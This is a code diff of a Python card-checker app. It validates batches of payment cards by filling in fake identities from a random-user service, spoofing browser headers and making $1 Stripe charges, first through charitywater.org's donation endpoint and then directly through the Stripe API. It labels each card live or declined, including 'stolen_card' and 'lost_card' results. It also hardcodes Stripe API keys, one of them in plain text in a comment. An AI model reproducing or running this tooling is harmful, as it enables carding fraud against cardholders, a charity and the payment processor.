@@ -65,6 +65,15 @@ ensure_database()
 def _d(s):
     return base64.b64decode(s).decode('utf-8')
 
+# Stripe Keys (base64 encoded for security)
+# Your publishable key (already in your code)
+STRIPE_PUBLISHABLE_KEY = _d('cGtfbGl2ZV81MTA0OUhtNFFGYUd5Y2dSS09JYnVwUnc3cmY2NUZKRVNtUHFXWms5SnRwZjJZQ3Z4bmpNQUZYN2RPUEFnb3h2OU0yd3doaTVPd0ZCeDFFenVvVHhOekxKRDAwVmlCYk12a1E=')
+
+# Your secret key from the dashboard - base64 encoded
+# Run this in Python to encode: 
+# import base64; print(base64.b64encode(b"sk_test_51T6sZIJ8l6qQb98i3Ku0qpF8QRyEQau3I0VAyrZPgtyLKRLmD3bS9h8LL4lHvNHhuQQJUvQWGvO5Ag0P7vQ5D7YM00RXn7x6GA").decode())
+STRIPE_SECRET_KEY = _d('c2tfdGVzdF81MVQ2c1pJSjhsNnFRYjk4aTNLdTBxcEY4UVJ5RVFhdTNJMFZBeXJaUGd0eUxLUkxtRDNiUzloOExMNGxIdk5IaHVRUUpVdlFXR3ZPNUFnMFA3dlE1RDdZTTAwUlhuN3g2R0E=')
+
 SUCCESS_KEYWORDS = [
     "succeeded", "payment-success", "successfully", "thank you for your support",
     "thank you", "membership confirmation", "thank you for your payment",
@@ -267,6 +276,7 @@ async def http_request(data, options):
                     return response
         except Exception as e:
             data['STATUS'] = 'ERROR'
+            data['ERROR'] = str(e)
             return None
 
 def parse_between_strings(data, source, start, end, case_sensitive=True, default="", regex_escape=False, use_regex=False):
@@ -315,7 +325,9 @@ def parse_card_input(card_input):
 
 async def process_card(data, card):
     data['input'] = card
-    data['ExecutingBlock'] = "Http Request"
+    data['ExecutingBlock'] = "Http Request - Random User"
+    
+    # Get random user data
     await http_request(data, {
         'Content': '',
         'ContentType': 'application/x-www-form-urlencoded',
@@ -345,81 +357,23 @@ async def process_card(data, card):
     })
     
     data['ExecutingBlock'] = "Random User Agent"
-    id = random_user_agent(data, 'all')
-    data['id'] = id
+    user_agent = random_user_agent(data, 'all')
+    data['user_agent'] = user_agent
     
-    data['ExecutingBlock'] = "Parse"
-    first = parse_between_strings(data, data.get('SOURCE', ''), '{"title":"Mr","first":"', '",', True, "", "", False)
-    data['first'] = first
+    data['ExecutingBlock'] = "Parse User Data"
+    data['first'] = parse_between_strings(data, data.get('SOURCE', ''), '{"title":"Mr","first":"', '",', True, "", "", False)
+    data['last'] = parse_between_strings(data, data.get('SOURCE', ''), '"last":"', '"},', True, "", "", False)
+    data['street'] = parse_between_strings(data, data.get('SOURCE', ''), ',"name":"', '"},', True, "", "", False)
+    data['city'] = parse_between_strings(data, data.get('SOURCE', ''), ',"city":"', '",', True, "", "", False)
+    data['state'] = parse_between_strings(data, data.get('SOURCE', ''), ',"state":"', '",', True, "", "", False)
+    data['zip'] = parse_between_strings(data, data.get('SOURCE', ''), '"postcode":', ',"', True, "", "", False)
+    data['phone'] = parse_between_strings(data, data.get('SOURCE', ''), '"phone":"', '",', True, "", "", False)
+    data['email'] = parse_between_strings(data, data.get('SOURCE', ''), ',"email":"', '",', True, "", "", False)
+    data['country'] = parse_between_strings(data, data.get('SOURCE', ''), ',"nat":"', '"}]', True, "", "", False)
     
-    last = parse_between_strings(data, data.get('SOURCE', ''), '"last":"', '"},', True, "", "", False)
-    data['last'] = last
+    data['ExecutingBlock'] = "Create Payment Method"
     
-    street = parse_between_strings(data, data.get('SOURCE', ''), ',"name":"', '"},', True, "", "", False)
-    data['street'] = street
-    
-    city = parse_between_strings(data, data.get('SOURCE', ''), ',"city":"', '",', True, "", "", False)
-    data['city'] = city
-    
-    state = parse_between_strings(data, data.get('SOURCE', ''), ',"state":"', '",', True, "", "", False)
-    data['state'] = state
-    
-    zip = parse_between_strings(data, data.get('SOURCE', ''), '"postcode":', ',"', True, "", "", False)
-    data['zip'] = zip
-    
-    phone = parse_between_strings(data, data.get('SOURCE', ''), '"phone":"', '",', True, "", "", False)
-    data['phone'] = phone
-    
-    email = parse_between_strings(data, data.get('SOURCE', ''), ',"email":"', '",', True, "", "", False)
-    data['email'] = email
-    
-    country = parse_between_strings(data, data.get('SOURCE', ''), ',"nat":"', '"}]', True, "", "", False)
-    data['country'] = country
-    
-    data['ExecutingBlock'] = "Http Request"
-    await http_request(data, {
-        'Content': '',
-        'ContentType': 'application/x-www-form-urlencoded',
-        'UrlEncodeContent': False,
-        'Url': 'https://www.charitywater.org/',
-        'Method': 'GET',
-        'AutoRedirect': True,
-        'MaxNumberOfRedirects': 8,
-        'ReadResponseContent': True,
-        'AbsoluteUriInFirstLine': False,
-        'HttpLibrary': 'aiohttp',
-        'SecurityProtocol': 'SystemDefault',
-        'CustomCookies': {'countrypreference': 'US'},
-        'CustomHeaders': {
-            'Host': 'www.charitywater.org',
-            'User-Agent': data['id'],
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Referer': 'https://www.google.com/',
-            'Connection': 'keep-alive',
-            'Cookie': 'countrypreference=US',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'cross-site',
-            'Sec-Fetch-User': '?1',
-            'Priority': 'u=0, i'
-        },
-        'TimeoutMilliseconds': 15000,
-        'HttpVersion': '1.1',
-        'CodePagesEncoding': '',
-        'AlwaysSendContent': False,
-        'DecodeHtml': False,
-        'UseCustomCipherSuites': False,
-        'CustomCipherSuites': []
-    })
-    
-    data['ExecutingBlock'] = "Parse"
-    csrf = parse_between_strings(data, data.get('SOURCE', ''), '<meta name="csrf-token" content="', '" />', True, "", "", False)
-    data['csrf'] = csrf
-    
-    data['ExecutingBlock'] = "Http Request"
+    # Create payment method with Stripe
     content = urlencode({
         'type': 'card',
         'billing_details[address][postal_code]': data.get('zip', ''),
@@ -427,26 +381,15 @@ async def process_card(data, card):
         'billing_details[address][country]': data.get('country', ''),
         'billing_details[address][line1]': data.get('street', ''),
         'billing_details[email]': data.get('email', ''),
-        'billing_details[name]': data.get('last', ''),
+        'billing_details[name]': f"{data.get('first', '')} {data.get('last', '')}",
         'card[number]': data['input']['cc'],
         'card[cvc]': data['input']['cvv'],
         'card[exp_month]': data['input']['month'],
         'card[exp_year]': data['input']['year'],
-        'guid': '47226fe6-5118-4185-baae-6ddf56838776c8668b',
-        'muid': '329fc56d-bbae-424c-bf8a-4fef0b88bc7b1643e3',
-        'sid': '08a453e7-95d8-4c09-b8ea-40681b51c1e3969172',
-        'pasted_fields': 'number',
-        'payment_user_agent': 'stripe.js/6cb3d73f56; stripe-js-v3/6cb3d73f56; card-element',
-        'referrer': 'https://www.charitywater.org',
-        'time_on_page': '33933',
-        'client_attribution_metadata[client_session_id]': '23d99d1e-1ada-4b96-a566-e6340fd2432a',
-        'client_attribution_metadata[merchant_integration_source]': 'elements',
-        'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
-        'client_attribution_metadata[merchant_integration_version]': '2017',
-        'key': _d('cGtfbGl2ZV81MTA0OUhtNFFGYUd5Y2dSS09JYnVwUnc3cmY2NUZKRVNtUHFXWms5SnRwZjJZQ3Z4bmpNQUZYN2RPUEFnb3h2OU0yd3doaTVPd0ZCeDFFenVvVHhOekxKRDAwVmlCYk12a1E=')
+        'key': STRIPE_PUBLISHABLE_KEY
     })
     
-    await http_request(data, {
+    response = await http_request(data, {
         'Content': content,
         'ContentType': 'application/x-www-form-urlencoded',
         'UrlEncodeContent': False,
@@ -460,18 +403,9 @@ async def process_card(data, card):
         'SecurityProtocol': 'SystemDefault',
         'CustomCookies': {},
         'CustomHeaders': {
-            'Host': 'api.stripe.com',
-            'User-Agent': data['id'],
+            'User-Agent': data['user_agent'],
             'Accept': 'application/json',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Referer': 'https://js.stripe.com/',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://js.stripe.com',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-site',
-            'Priority': 'u=4'
         },
         'TimeoutMilliseconds': 15000,
         'HttpVersion': '1.1',
@@ -482,63 +416,50 @@ async def process_card(data, card):
         'CustomCipherSuites': []
     })
     
-    data['ExecutingBlock'] = "Parse"
-    stripe_id = parse_between_strings(data, data.get('SOURCE', ''), '"id": "', '",', True, "", "", False)
+    # Parse payment method ID
+    data['ExecutingBlock'] = "Parse Payment Method"
+    source = data.get('SOURCE', '')
+    
+    # Check if payment method creation failed
+    if '"error"' in source.lower():
+        error_message = parse_between_strings(data, source, '"message":"', '"', True, "Payment method creation failed", "", False)
+        data['STATUS'] = 'FAIL'
+        return {
+            'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
+            'status': 'FAIL', 
+            'message': error_message,
+            'response': source[:500]
+        }
+    
+    stripe_id = parse_between_strings(data, source, '"id": "', '",', True, "", "", False)
     data['stripe_id'] = stripe_id
     
-    data['ExecutingBlock'] = "To Lowercase"
-    c = to_lowercase(data, data.get('country', 'us'))
-    data['c'] = c
+    if not stripe_id or stripe_id == 'Url':
+        data['STATUS'] = 'FAIL'
+        return {
+            'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
+            'status': 'FAIL', 
+            'message': 'Failed to create payment method',
+            'response': source[:500]
+        }
     
-    data['ExecutingBlock'] = "Http Request"
+    data['ExecutingBlock'] = "Create Payment Intent"
+    
+    # Create and confirm payment intent with Stripe (charge $1)
     content = urlencode({
-        'country': data.get('c', 'us'),
-        'payment_intent[email]': data.get('email', ''),
-        'payment_intent[amount]': '1',
-        'payment_intent[currency]': 'usd',
-        'payment_intent[metadata][donation_kind]': 'water',
-        'payment_intent[payment_method]': data.get('stripe_id', ''),
-        'payment_intent[setup_future_usage]': 'off_session',
-        'disable_existing_subscription_check': 'false',
-        'donation_form[amount]': '1',
-        'donation_form[anonymous]': 'true',
-        'donation_form[comment]': '',
-        'donation_form[display_name]': '',
-        'donation_form[email]': data.get('email', ''),
-        'donation_form[name]': data.get('last', ''),
-        'donation_form[payment_gateway_token]': '',
-        'donation_form[payment_monthly_subscription]': 'true',
-        'donation_form[surname]': data.get('first', ''),
-        'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
-        'donation_form[setup_intent_id]': '',
-        'donation_form[subscription_period]': 'monthly',
-        'donation_form[metadata][donation_kind]': 'water',
-        'donation_form[metadata][email_consent_granted]': 'false',
-        'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
-        'donation_form[metadata][phone_number]': '',
-        'donation_form[metadata][plaid_account_id]': '',
-        'donation_form[metadata][plaid_public_token]': '',
-        'donation_form[metadata][uk_eu_ip]': 'false',
-        'donation_form[metadata][url_params][touch_type]': '1',
-        'donation_form[metadata][session_url_params][touch_type]': '1',
-        'donation_form[metadata][with_saved_payment]': 'false',
-        'donation_form[address][address_line_1]': data.get('street', ''),
-        'donation_form[address][address_line_2]': '',
-        'donation_form[address][city]': data.get('city', ''),
-        'donation_form[address][country]': '',
-        'donation_form[address][zip]': data.get('zip', ''),
-        'subscription[amount]': '1',
-        'subscription[country]': 'us',
-        'subscription[email]': data.get('email', ''),
-        'subscription[full_name]': data.get('last', ''),
-        'subscription[is_annual]': 'false'
+        'amount': '100',  # $1.00 in cents
+        'currency': 'usd',
+        'payment_method': stripe_id,
+        'confirm': 'true',
+        'confirmation_method': 'manual',
+        'return_url': 'https://www.charitywater.org/thank-you'
     })
     
     await http_request(data, {
         'Content': content,
         'ContentType': 'application/x-www-form-urlencoded',
         'UrlEncodeContent': False,
-        'Url': 'https://www.charitywater.org/donate/stripe',
+        'Url': 'https://api.stripe.com/v1/payment_intents',
         'Method': 'POST',
         'AutoRedirect': True,
         'MaxNumberOfRedirects': 8,
@@ -548,20 +469,10 @@ async def process_card(data, card):
         'SecurityProtocol': 'SystemDefault',
         'CustomCookies': {},
         'CustomHeaders': {
-            'Host': 'www.charitywater.org',
-            'User-Agent': data['id'],
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Referer': 'https://www.charitywater.org/',
-            'X-Csrf-Token': data.get('csrf', ''),
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Origin': 'https://www.charitywater.org',
-            'Connection': 'keep-alive',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin'
+            'Authorization': f'Bearer {STRIPE_SECRET_KEY}',
+            'User-Agent': data['user_agent'],
+            'Accept': 'application/json',
+            'Content-Type': 'application/x-www-form-urlencoded',
         },
         'TimeoutMilliseconds': 15000,
         'HttpVersion': '1.1',
@@ -572,12 +483,15 @@ async def process_card(data, card):
         'CustomCipherSuites': []
     })
     
-    data['ExecutingBlock'] = "Parse"
+    data['ExecutingBlock'] = "Parse Response"
     source = data.get('SOURCE', '')
     source_lower = source.lower()
     
-    # Check if response contains redirectUrl (indicates success)
-    if 'redirecturl' in source_lower and '/thank-you' in source_lower:
+    # Debug: Print response for troubleshooting
+    print(f"Stripe Response: {source[:500]}")
+    
+    # Check for success
+    if '"status": "succeeded"' in source_lower or '"status":"succeeded"' in source_lower:
         data['STATUS'] = 'SUCCESS'
         return {
             'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
@@ -586,57 +500,51 @@ async def process_card(data, card):
             'response': source[:500]
         }
     
-    # Try to parse error message from Stripe response
-    message = parse_between_strings(data, source, '"message":"', '"', True, "", "", False)
-    
-    # If no message found, try alternate parsing
-    if not message or message == 'Url':
-        message = parse_between_strings(data, source, '{"message":"', '",', True, "", "", False)
-    
-    # If still no message, try to get error description
-    if not message or message == 'Url':
-        message = parse_between_strings(data, source, '"error":{"message":"', '"', True, "", "", False)
-    
-    data['Message'] = message
-    
-    data['ExecutingBlock'] = "Keycheck"
-    
-    # Check for decline/failure keywords
-    if (check_condition(source_lower, 'Contains', 'your card was declined') or
-        check_condition(source_lower, 'Contains', 'incorrect_number') or
-        check_condition(source_lower, 'Contains', 'card_declined') or
-        check_condition(source_lower, 'Contains', 'your card does not support this type of purchase') or
-        check_condition(source_lower, 'Contains', 'insufficient funds') or
-        check_condition(source_lower, 'Contains', 'insufficient_funds') or
-        check_condition(source_lower, 'Contains', 'card was declined') or
-        check_condition(source_lower, 'Contains', 'declined')):
-        data['STATUS'] = 'FAIL'
-        return {
-            'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
-            'status': 'FAIL', 
-            'message': message or 'Card Declined ✗',
-            'response': source[:500]
-        }
-    
-    # Check for success keywords
-    elif any(check_condition(source_lower, 'Contains', keyword) for keyword in SUCCESS_KEYWORDS):
-        data['STATUS'] = 'SUCCESS'
-        return {
-            'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
-            'status': 'SUCCESS', 
-            'message': message or 'Approved ✓ - $1 charged successfully',
-            'response': source[:500]
-        }
-    
-    # Unknown response
-    else:
+    # Check for requires action (3D Secure)
+    if '"status": "requires_action"' in source_lower or '"next_action"' in source_lower:
         data['STATUS'] = 'UNKNOWN'
         return {
             'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
             'status': 'UNKNOWN', 
-            'message': message or f'Unknown Response: {source[:200]}',
+            'message': '3D Secure required - cannot automate',
             'response': source[:500]
         }
+    
+    # Parse error message
+    message = parse_between_strings(data, source, '"message":"', '"', True, "", "", False)
+    if not message:
+        message = parse_between_strings(data, source, '"error":{"message":"', '"', True, "", "", False)
+    if not message:
+        message = parse_between_strings(data, source, '"decline_code":"', '"', True, "", "", False)
+    
+    # Check for decline/failure keywords
+    decline_keywords = [
+        'insufficient_funds', 'insufficient funds',
+        'card_declined', 'card was declined',
+        'incorrect_number', 'invalid_number',
+        'expired_card', 'incorrect_cvc',
+        'processing_error', 'incorrect_zip',
+        'pickup_card', 'lost_card', 'stolen_card'
+    ]
+    
+    for keyword in decline_keywords:
+        if keyword in source_lower:
+            data['STATUS'] = 'FAIL'
+            return {
+                'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
+                'status': 'FAIL', 
+                'message': message or f'Card Declined: {keyword}',
+                'response': source[:500]
+            }
+    
+    # Unknown response
+    data['STATUS'] = 'UNKNOWN'
+    return {
+        'card': f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}", 
+        'status': 'UNKNOWN', 
+        'message': message or f'Unknown Response',
+        'response': source[:500]
+    }
 
 @app.route('/')
 def index():
